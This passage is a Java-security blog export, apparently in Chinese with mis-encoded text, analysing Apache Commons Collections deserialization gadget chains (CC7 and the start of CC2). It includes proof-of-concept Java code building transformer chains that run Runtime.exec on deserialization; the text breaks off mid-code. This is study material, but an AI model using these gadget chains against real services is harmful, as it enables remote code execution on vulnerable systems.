class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AbstractMapDecorator</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Map</span> </span>&#123;<br>    ...<br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">transient</span> Map map;<br>    <br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">equals</span><span class="hljs-params">(Object object)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (object == <span class="hljs-keyword">this</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> map.equals(object);<span class="hljs-comment">// ä»è¿™é‡Œè¿›å…¥åˆ°LazyMap.equals</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="AbstractMap"><a href="#AbstractMap" class="headerlink" title="AbstractMap"></a><code>AbstractMap</code></h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AbstractMap</span>&lt;<span class="hljs-title">K</span>,<span class="hljs-title">V</span>&gt; <span class="hljs-keyword">implements</span> <span class="hljs-title">Map</span>&lt;<span class="hljs-title">K</span>,<span class="hljs-title">V</span>&gt; </span>&#123;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">equals</span><span class="hljs-params">(Object o)</span> </span>&#123;<span class="hljs-comment">// æ³¨æ„ä¸‹åˆ«ä¼ é”™äº†å°±å¥½äº†ï¼Œä¸¤ä¸ªhashMap,ä¸¤ä¸ªlazyMap</span><br>        <span class="hljs-keyword">if</span> (o == <span class="hljs-keyword">this</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br><br>        <span class="hljs-keyword">if</span> (!(o <span class="hljs-keyword">instanceof</span> Map))<span class="hljs-comment">// ä¼ çš„éƒ½æ˜¯mapæ——ä¸‹çš„ï¼Œå¿½ç•¥</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>        Map&lt;?,?&gt; m = (Map&lt;?,?&gt;) o;<br>        <span class="hljs-keyword">if</span> (m.size() != size())<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator();<br>            <span class="hljs-keyword">while</span> (i.hasNext()) &#123;<span class="hljs-comment">// è¿™ä¸ªæ­£å¸¸ä¼ éƒ½æ²¡é—®é¢˜</span><br>                Entry&lt;K,V&gt; e = i.next();<br>                K key = e.getKey();<br>                V value = e.getValue();<br>                <span class="hljs-keyword">if</span> (value == <span class="hljs-keyword">null</span>) &#123;<span class="hljs-comment">// LazyMap#putæ—¶ï¼Œvalueåˆ«ä¼ nullå°±å¥½äº†</span><br>                    <span class="hljs-keyword">if</span> (!(m.get(key)==<span class="hljs-keyword">null</span> &amp;&amp; m.containsKey(key)))<span class="hljs-comment">// m.get(key)// keyæ— æ‰€è°“ï¼Œä¸»è¦æ˜¯m</span><br>                        <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>                ...<br>&#125;<br></code></pre></td></tr></table></figure><p>å‚è€ƒå®˜æ–¹çš„æ€è·¯ï¼Œè‡ªå·±æ‹ä¸€ä¸‹ï¼š</p><p><code>Hashtable#readObject</code> â€“&gt; <code>Hashtable#reconstitutionPut</code> â€“&gt; <code>LazyMap#equals</code>(ä½†Lazyåˆæ²¡æœ‰equalsï¼Œæ‰€ä»¥æ¥åˆ°çˆ¶ç±») â€“&gt; <code>AbstractMapDecorator#equals</code> â€“&gt;<code>HashMap#equals</code>(HashMapä¹Ÿæ²¡æœ‰equalsï¼Œæ‰€ä»¥æ¥åˆ°çˆ¶ç±»)â€“&gt; <code>AbstractMap#equals</code> â€“&gt; <code>LazyMap#get</code></p><p>æ¥ä¸‹æ¥å°±æ˜¯ä¸€æ­¥ä¸€æ­¥çš„æ»¡è¶³å»è°ƒç”¨å°±OKäº†</p><h4 id="æ³¨æ„"><a href="#æ³¨æ„" class="headerlink" title="æ³¨æ„"></a>æ³¨æ„</h4><ul><li><p><code>Hashtable#readObject</code></p><p>è¿™é‡Œæœ‰ä¸ªforå¾ªç¯ï¼Œæ»¡è¶³çš„è¯éœ€è¦HashTableä¸­æœ‰å€¼ï¼Œæ‰èƒ½èµ°åˆ°<code>reconstitutionPut</code>ï¼Œä¸è¿‡è¿™é‡Œæ²¡ä»€ä¹ˆï¼Œå› ä¸ºä¸€å®šä¼šå‘HashTableæ·»åŠ å€¼çš„ï¼Œä½¿ç”¨<code>Hashtable#put</code>æ·»åŠ ï¼Œæ·»åŠ çš„æ—¶å€™éœ€è¦æ³¨æ„<strong>keyçš„hashå€¼ä¸èƒ½ç›¸åŒ</strong>æˆ–è€…<strong>keyä¸èƒ½ç›¸åŒ</strong>ï¼Œå¦åˆ™æ— æ³•æ·»ä¸è¿›å»</p><p><img src="/2022/10/22/CommonsCollections4%E3%80%815%E3%80%817/5.png"></p></li><li><p><code>Hashtable#reconstitutionPut</code></p><ul><li><p><code>tab[index]</code>è¯¥å€¼ä¸èƒ½ä¸ºç©º ï¼Œå¦åˆ™æ— æ³•è¿›å…¥å¾ªç¯ï¼Œtabçš„èµ‹å€¼å‘ç°äº†ä¸¤å¤„ï¼Œä¸€ä¸ªæ˜¯<code>addEntry</code>è¿™ä¸ªåœ¨ååºåˆ—åŒ–çš„æ—¶å€™ä¸èƒ½ç”¨ï¼Œå¦ä¸€ä¸ªæ˜¯åœ¨è¯¥å‡½æ•°forå¾ªç¯çš„ä¸‹é¢ï¼Œä¼šä¸ºtab[index]èµ‹å€¼ï¼Œè¿™é‡Œå¯ä»¥åœ¨ååºåˆ—è¯çš„æ—¶å€™ä½¿ç”¨ï¼Œæ‰€ä»¥é€‰æ‹©æ­¤å¤„ã€‚ä¹Ÿå°±æ˜¯éœ€è¦ç¬¬ä¸€æ¬¡æ·»åŠ çš„indexå’Œç¬¬äºŒæ¬¡ä½¿ç”¨çš„indexçš„å€¼ç›¸åŒï¼Œä¹Ÿå°±æ˜¯è¦æ»¡è¶³ä¸¤æ¬¡<code>key.hashCode</code>ç›¸åŒ</p></li><li><p><code>int index = (hash &amp; 0x7FFFFFFF) % tab.length;</code>å…ˆä½è¿ç®—ï¼Œå†å–ä½™</p><p><code>int hash = key.hashCode();</code>hashçš„æ¥æºï¼Œè¿™é‡Œå°±éœ€è¦å…ˆæ‰¾ä¸€ä¸‹ï¼Œå“ªäº›keyç»è¿‡è®¡ç®—åçš„indexçš„å€¼ç›¸åŒ</p><p>å› ä¸ºè¿™é‡Œéœ€è¦ä¼ å…¥LazyMapï¼Œæ‰€ä»¥å…ˆæ¥çœ‹ä¸€ä¸‹<code>LazyMap#hashCode</code>ï¼Œæ²¡æœ‰ï¼Œä½¿ç”¨çˆ¶ç±»çš„hashCodeè¿›è¡Œè®¡ç®—ï¼Œæœ€ç»ˆè°ƒç”¨çš„æ˜¯<code>hashMap#hashCode</code>ï¼Œè¿˜éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨<code>HashTable#put</code>æ—¶ä¸¤ä¸ªkeyä¸èƒ½ç›¸åŒ</p><p>å¤§æ¦‚ç®—ä¸€ä¸‹ï¼Œæœ‰å¥½å¤šçš„ï¼Œéšä¾¿å–ä¸€ä¸ª</p><p><img src="/2022/10/22/CommonsCollections4%E3%80%815%E3%80%817/6.png"></p></li><li><p>å†å‘HashTable#putæ—¶ï¼Œä¼šæ”¹å˜LazyMapçš„keyï¼ˆæµ‹è¯•è¿‡ç¨‹ä¸­å‘ç°ï¼‰</p><p><img src="/2022/10/22/CommonsCollections4%E3%80%815%E3%80%817/7.png"></p><p>å…¶åŸå› æ˜¯åœ¨<code>Hashtable#put</code>ä¸­è°ƒç”¨äº†<code>key.equals(key)</code>è·Ÿè¿›åˆ°<code>AbstractMap#equals</code>,å†åˆ°<code>LazyMap#get</code></p><p><img src="/2022/10/22/CommonsCollections4%E3%80%815%E3%80%817/8.png"></p><p>åœ¨<code>LazyMap#get</code>ä¸­è°ƒç”¨äº†putæ–¹æ³•ï¼Œå¯¼è‡´lazyMap2å¤šäº†ä¸€ä¸ª</p><p><img src="/2022/10/22/CommonsCollections4%E3%80%815%E3%80%817/9.png"></p><p>ä¸ºäº†æ»¡è¶³hashå€¼ç›¸ç­‰ï¼Œæ‰€ä»¥éœ€è¦å°†å¤šå‡ºæ¥çš„è¿™ä¸ªremoveæ‰ï¼Œç°åœ¨æ¥åˆ°<code>org.apache.commons.collections.map.AbstractMapDecorator#equals</code>ä¸­</p></li><li><p>ç„¶ååé¢çš„å°±æ²¡æœ‰ä»€ä¹ˆäº†ï¼Œç›´æ¥å°±æ˜¯èƒ½å¤Ÿèµ°åˆ°<code>java.util.AbstractMap#equals</code></p><p><img src="/2022/10/22/CommonsCollections4%E3%80%815%E3%80%817/10.png"></p><p>æ‰€ä»¥æ­¤æ—¶ï¼Œå½“mæ˜¯é‚£ä¸ªå¸¦æœ‰æ‰§è¡Œä»£ç çš„LazyMapå°±ok</p></li></ul><p>åˆ†æå‘ç°ï¼Œmå°±æ˜¯LazyMap2ï¼Œæ‰€ä»¥å¯ä»¥å†™pocäº†</p></li></ul><h4 id="POC-2"><a href="#POC-2" class="headerlink" title="POC"></a>POC</h4>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception</span>&#123;<br>    ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]&#123;<br>        <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>        <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">null</span>&#125;),<br>        <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;Runtime.class,<span class="hljs-keyword">null</span>&#125;),<br>        <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>    &#125;);<br><br>    Map map1 = <span class="hljs-keyword">new</span> HashMap();<br>    Map map2 = <span class="hljs-keyword">new</span> HashMap();<br><br>    Map lazyMap1 = LazyMap.decorate(map1,<span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>));<br>    lazyMap1.put(<span class="hljs-string">&quot;aa&quot;</span>,<span class="hljs-number">1</span>);<br>    Map lazyMap2 = LazyMap.decorate(map2, <span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">2</span>));<br>    lazyMap2.put(<span class="hljs-string">&quot;bB&quot;</span>,<span class="hljs-number">1</span>);<br><br>    Hashtable hashtable = <span class="hljs-keyword">new</span> Hashtable();<br>    hashtable.put(lazyMap1,<span class="hljs-number">1</span>);<br>    hashtable.put(lazyMap2,<span class="hljs-number">1</span>);<br>    lazyMap2.remove(<span class="hljs-string">&quot;aa&quot;</span>);<br><br>    Field factory = LazyMap.class.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>    factory.setAccessible(<span class="hljs-keyword">true</span>);<br>    factory.set(lazyMap2,chainedTransformer);<br><br>    serialize(hashtable);<br>    deserialize();<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2022/10/22/CommonsCollections4%E3%80%815%E3%80%817/11.png"></p><p>ç®€å•æ€»ç»“ä¸‹CC7ï¼Œemmmmâ€¦.ï¼Œæ˜¯æœ‰ç‚¹ç»•çš„ï¼Œå¹¶ä¸”æ¶‰åŠåˆ°ä¸€ä¸ªhashç¢°æ’çš„é—®é¢˜ï¼Œèœé¸¡çš„æˆ‘ä¸€å¼€å§‹æœ‰ç‚¹æ‰‹è¶³æ— æ‰€ğŸ˜£ï¼Œä¸è¿‡è¿˜å¥½ä¸ç®—å¤ªéš¾ï¼Œè¿˜æå¾—æ¥ã€‚</p><p>å›¾åˆå¯ä»¥æ›´æ–°äº†</p><p><img src="/2022/10/22/CommonsCollections4%E3%80%815%E3%80%817/12.png"></p><h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>CCä¹Ÿç®—æ˜¯çœ‹å®Œäº†ï¼Œå…¶å®æ„Ÿè§‰æœ€ç»ˆè¦çš„æ˜¯å±é™©æ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯æœ€ç»ˆèƒ½æ‰§è¡Œä»£ç çš„åœ°æ–¹ï¼ŒCCä¸€å…±7æ¡é“¾ï¼Œæœ€ç»ˆèƒ½å¤Ÿæ‰§è¡Œä»£ç çš„åœ°æ–¹ä¹Ÿå°±ä¸¤å¤„ï¼Œæ‰€ä»¥å°±æ˜¯æ‰¾å±é™©æ–¹æ³•å¾ˆé‡è¦ï¼Œé“¾å­çš„è¯ï¼Œæ…¢æ…¢æ‰¾å‘—ï¼ŒåŸºæœ¬ä¸Šéƒ½ä¼šæœ‰çš„å§ï¼Œä¸è¿‡å¯èƒ½ä¼šéº»çƒ¦ä¸€ç‚¹</p><h3 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h3><ul><li><a href="https://blog.csdn.net/qq_52988816/article/details/126396248">Javaå®‰å…¨â€”CommonsCollections7</a></li><li><a href="https://www.bilibili.com/video/BV1NQ4y1q7EU/?spm_id_from=333.999.0.0&vd_source=db93b94230228cb739b48f4f59e74abd">Javaååºåˆ—åŒ–CommonsCollectionsç¯‡(å››)-æ‘†çƒ‚çš„å®Œç»“ç¯‡</a></li><li><a href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections7.java">ysoserial_CommonsCollections7</a></li><li><a href="https://blog.csdn.net/huyuchengus/article/details/128125547">Java Hash ç¢°æ’</a></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>Javaå®‰å…¨</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CommonsCollections2</title>
    <link href="/2022/10/15/CommonsCollections2/"/>
    <url>/2022/10/15/CommonsCollections2/</url>
    
    <content type="html"><![CDATA[<h2 id="CommonsCollections2"><a href="#CommonsCollections2" class="headerlink" title="CommonsCollections2"></a>CommonsCollections2</h2><h3 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h3><p>è¿™æ¡é“¾å‘¢ï¼Œæ˜¯CommonsCollections4.0ç‰ˆæœ¬çš„ï¼Œå’ŒCommonsCollections3+ç‰ˆæœ¬å…¶å®å˜åŒ–ä¸å¤ªå¤§ï¼Œä½†è¿˜æ˜¯æ¥çœ‹çœ‹å§ï¼Œå°è¯•ä¸€ä¸‹åªå‚è€ƒ<code>ysoserial</code>ï¼Œè‡ªå·±èƒ½ä¸èƒ½æå‡ºæ¥</p><h4 id="ç¯å¢ƒï¼š"><a href="#ç¯å¢ƒï¼š" class="headerlink" title="ç¯å¢ƒï¼š"></a>ç¯å¢ƒï¼š</h4><p>jdk8u341</p><p>CommonsCollections4.0</p><h3 id="0x01-ä½¿ç”¨HashMapæµ‹è¯•"><a href="#0x01-ä½¿ç”¨HashMapæµ‹è¯•" class="headerlink" title="0x01 ä½¿ç”¨HashMapæµ‹è¯•"></a>0x01 ä½¿ç”¨HashMapæµ‹è¯•</h3><p>å…¶å®4.0è¿™ä¸ªç‰ˆæœ¬ï¼Œç”¨<code>hashMap</code>ä¹Ÿèƒ½ç”¨ï¼Œ<code>CommonsCollections</code>çš„ä¸­ç”¨åˆ°çš„åœ°æ–¹å˜åŒ–ä¸å¤ªå¤§</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>    Transformer&lt;Object,Object&gt;[] transformer = <span class="hljs-keyword">new</span> Transformer[]&#123;<br>        <span class="hljs-keyword">new</span> ConstantTransformer&lt;Object,Object&gt;(Runtime.class),<br>        <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">null</span>&#125;),<br>        <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;Runtime.class,<span class="hljs-keyword">null</span>&#125;),<br>        <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>    &#125;;<br><br>    ChainedTransformer&lt;Object&gt; chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer&lt;&gt;(transformer);<br><br>    HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();<br>    <span class="hljs-comment">// LazyMapçš„è·å–æ–¹æ³•å˜äº†</span><br>    Map lazyMap = LazyMap.lazyMap(map,<span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-string">&quot;q&quot;</span>));<br><br>    TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> TiedMapEntry(lazyMap, <span class="hljs-string">&quot;111&quot;</span>);<br><br>    HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();<br>    hashMap.put(tiedMapEntry,<span class="hljs-string">&quot;222&quot;</span>);<br>    lazyMap.remove(<span class="hljs-string">&quot;111&quot;</span>);<br><br>    Class aClass = LazyMap.class;<br>    Field factory = aClass.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>    factory.setAccessible(<span class="hljs-keyword">true</span>);<br>    factory.set(lazyMap,chainedTransformer);<br><br>    <span class="hljs-comment">//        serialize(hashMap);</span><br>    deserialize();<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2022/10/15/CommonsCollections2/1.png"></p><p>å½“ç„¶ï¼ŒåŸæ¥å…¶ä»–çš„åº”è¯¥ä¹Ÿæ˜¯å¯ä»¥ä½¿ç”¨çš„ï¼Œä½†æ‡’å¾—å¼„äº†ï¼Œæ²¡å•¥å¤ªå¤§åŒºåˆ«ï¼Œæ¥çœ‹ä¸€ä¸‹æ–°çš„è°ƒç”¨é“¾</p><h3 id="0x02-æ–°çš„è°ƒç”¨é“¾"><a href="#0x02-æ–°çš„è°ƒç”¨é“¾" class="headerlink" title="0x02 æ–°çš„è°ƒç”¨é“¾"></a>0x02 æ–°çš„è°ƒç”¨é“¾</h3><p><img src="/2022/10/15/CommonsCollections2/2.png"></p><p>æ–°çš„é“¾å‡ ä¹å’ŒåŸæ¥çš„åŒºåˆ«ä¸å¤§ï¼Œåªä¸è¿‡å…¥å£ç‚¹ä»¥åŠä¸­é—´çš„ä¸€äº›éƒ¨åˆ†å‘ç”Ÿäº†å˜åŒ–</p><h4 id="TransformingComparator"><a href="#TransformingComparator" class="headerlink" title="TransformingComparator"></a><code>TransformingComparator</code></h4><p>å…ˆæ¥çœ‹ä¸€ä¸‹è¿™ä¸ªç±»ï¼Œçœ‹ä¸€ä¸‹ä¸€äº›é‡è¦çš„ä¸œè¥¿ï¼Œä¸é‡è¦çš„å°±å¿½ç•¥äº†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TransformingComparator</span>&lt;<span class="hljs-title">I</span>, <span class="hljs-title">O</span>&gt; <span class="hljs-keyword">implements</span> <span class="hljs-title">Comparator</span>&lt;<span class="hljs-title">I</span>&gt;, <span class="hljs-title">Serializable</span> </span>&#123;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Transformer&lt;? <span class="hljs-keyword">super</span> I, ? extends O&gt; transformer;<br>    ...<br>        <br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">TransformingComparator</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Transformer&lt;? <span class="hljs-keyword">super</span> I, ? extends O&gt; transformer)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>(transformer, ComparatorUtils.NATURAL_COMPARATOR);<br>    &#125;<br>    <br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">compare</span><span class="hljs-params">(<span class="hljs-keyword">final</span> I obj1, <span class="hljs-keyword">final</span> I obj2)</span> </span>&#123;<br>        <span class="hljs-keyword">final</span> O value1 = <span class="hljs-keyword">this</span>.transformer.transform(obj1);<span class="hljs-comment">// è°ƒç”¨transformer,è¯¥å˜é‡å¯æ§</span><br>        <span class="hljs-keyword">final</span> O value2 = <span class="hljs-keyword">this</span>.transformer.transform(obj2);<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.decorated.compare(value1, value2);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>æµ‹è¯•ä¸€ä¸‹ï¼Œèƒ½å¤ŸæˆåŠŸï¼Œå¹¶ä¸”è°ƒç”¨äº†ä¸¤æ¬¡</p><p><img src="/2022/10/15/CommonsCollections2/3.png"></p><p>æ¥ä¸‹æ¥å°±æ˜¯ç»§ç»­å‘ä¸Šæ‰¾å“ªé‡Œè°ƒç”¨äº†è¿™ä¸ªæ–¹æ³•ï¼Œç›´åˆ°<code>readObject</code>ï¼Œè¿™é‡Œèœé¸¡çš„æˆ‘ï¼Œæ‰¾ä¸åˆ°ï¼Œåªèƒ½çœ‹çœ‹æ•™ç¨‹ï¼Œè¿˜æ˜¯å¯¹å¼€å‘ä¸ç†Ÿ</p><p>æŒ‰ç…§æ•™ç¨‹ï¼Œç›´æ¥æ¥åˆ°<code>java.util.PriorityQueue</code></p><h4 id="java-util-PriorityQueue"><a href="#java-util-PriorityQueue" class="headerlink" title="java.util.PriorityQueue"></a><code>java.util.PriorityQueue</code></h4><p><code>java.util.PriorityQueue</code>æ˜¯Javaè¯­è¨€ä¸­çš„ä¸€ä¸ªç±»ï¼Œå®ç°äº†ä¸€ä¸ªåŸºäºä¼˜å…ˆçº§çš„é˜Ÿåˆ—ï¼ˆPriority Queueï¼‰ã€‚åœ¨è¿™ä¸ªé˜Ÿåˆ—ä¸­ï¼Œæ¯ä¸ªå…ƒç´ éƒ½æœ‰ä¸€ä¸ªå…³è”çš„ä¼˜å…ˆçº§ï¼Œå¹¶æŒ‰ç…§ä¼˜å…ˆçº§çš„é¡ºåºè¿›è¡Œæ’åºã€‚å…ƒç´ çš„ä¼˜å…ˆçº§å¯ä»¥ç”±ç”¨æˆ·å®šä¹‰ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨é»˜è®¤çš„è‡ªç„¶é¡ºåºã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PriorityQueue</span>&lt;<span class="hljs-title">E</span>&gt; <span class="hljs-keyword">extends</span> <span class="hljs-title">AbstractQueue</span>&lt;<span class="hljs-title">E</span>&gt; <span class="hljs-keyword">implements</span> <span class="hljs-title">java</span>.<span class="hljs-title">io</span>.<span class="hljs-title">Serializable</span> </span>&#123;<br>    <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> size = <span class="hljs-number">0</span>;<span class="hljs-comment">// åœ¨heapify()ä¸­ä½¿ç”¨ï¼Œéœ€æ»¡è¶³å³ç§»1ä½åå‡1ä»»ç„¶å¤§äº0ï¼Œåå°„æ”¹</span><br>    <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Comparator&lt;? <span class="hljs-keyword">super</span> E&gt; comparator;<br>    <span class="hljs-comment">//æ„é€ å™¨ä¸­ä¼ å…¥ï¼ŒTransformingComparatorä¹Ÿå®ç°äº†Comparatoræ¥å£</span><br>    <br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">PriorityQueue</span><span class="hljs-params">(Comparator&lt;? <span class="hljs-keyword">super</span> E&gt; comparator)</span> </span>&#123;<span class="hljs-comment">// ç›´æ¥è°ƒç”¨è¿™ä¸ªæ„é€ å™¨å³å¯å®ç°comparatorçš„èµ‹å€¼</span><br>        <span class="hljs-keyword">this</span>(DEFAULT_INITIAL_CAPACITY, comparator);<br>    &#125;<br>    <br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">PriorityQueue</span><span class="hljs-params">(<span class="hljs-keyword">int</span> initialCapacity,</span></span><br><span 